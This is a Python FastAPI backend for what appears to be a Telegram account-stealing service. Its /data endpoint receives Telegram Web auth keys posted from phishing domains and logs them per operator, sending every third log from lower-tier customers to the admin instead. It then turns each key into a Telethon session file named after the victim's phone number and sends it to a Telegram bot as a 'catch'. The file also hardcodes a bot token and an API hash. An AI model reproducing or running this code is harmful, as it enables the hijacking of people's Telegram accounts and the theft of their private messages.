import random
from typing import Union
from fastapi import Request
from fastapi import FastAPI
from fastapi import FastAPI, status
import json, telebot
from bot.utils import database as db
from fastapi.middleware.cors import CORSMiddleware
import asyncio
from bot.services.akey_to_telethon import prepare_account
from telethon.sync import TelegramClient
from aiogram.types import InputFile
app = FastAPI()
origins = ["*"]
tasks = []

API_ID = 26304178
API_HASH = "a44b8dfa8327bfe13a68d203d33eb4c6"


async def task_executor():
    while True:
        if tasks:
            for task in tasks:
                await task
            tasks.clear()
        await asyncio.sleep(5)


app.add_middleware(
    CORSMiddleware,
    allow_origins=origins,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

token = '7440556192:AAHUxJ87SKOFnWL8DcMaWX8uCY-I08iGPAY'
bot = telebot.TeleBot(token, parse_mode=None)
chat_id = 6937640343


@app.get("/")
async def read_root():
    return {"Hello": "World"}


@app.post("/data")
async def read_item(request: Request): 
    data = await request.json()
    print(data)
    if not data or not isinstance(data, dict) or 'dc' not in data:
        return status.HTTP_400_BAD_REQUEST

    try:
        [telegram_id] = await db.get_telegram_id_by_domain(data['domain'])
        if not telegram_id:
            telegram_id = chat_id
        else:
            [count_logs] = await db.get_count_logs(telegram_id)
            await db.add_new_log(telegram_id)
            access_level = await db.get_access_level(telegram_id)
            if access_level == 1:
                if count_logs % 3 == 0 and count_logs != 0:
                    print("Is log for admin")
                    telegram_id = chat_id

        dc_id = data['dc']
        key = "dc" + str(dc_id) + "_auth_key"
        hex_key = data[key]
        hex_key = hex_key.replace("\"", "")
 
        [auto_convert_status] = await db.get_auto_convert_status(telegram_id)

        data = f"{hex_key}:{dc_id}"
        await db.add_new_log_data(telegram_id, data)
        text_to_send = f"🦀 Улов!\n🔽 Auth_Key:DC_ID 🔽 <code>{data}</code>\n"
        if auto_convert_status:
            random_chars = ''.join(random.sample(hex_key, 8))
            await prepare_account(dc_id, hex_key, random_chars, "bot/sessions")
            client = TelegramClient(f"bot/sessions/{random_chars}", API_ID, API_HASH)
            await client.connect()
            me = await client.get_me()
            try:
                with open(f"bot/sessions/{random_chars}.session", 'rb') as file:
                    await bot.send_document(telegram_id, document=(f"{me.phone}.session", file),
                                        caption=text_to_send, parse_mode="HTML")
            except:
                pass
        else:
            try:
                bot.send_message(telegram_id, text_to_send, parse_mode="HTML")
            except:
                pass
 
 
      
    except Exception as e:
        print(e)
        return status.HTTP_500_INTERNAL_SERVER_ERROR

    return status.HTTP_200_OK
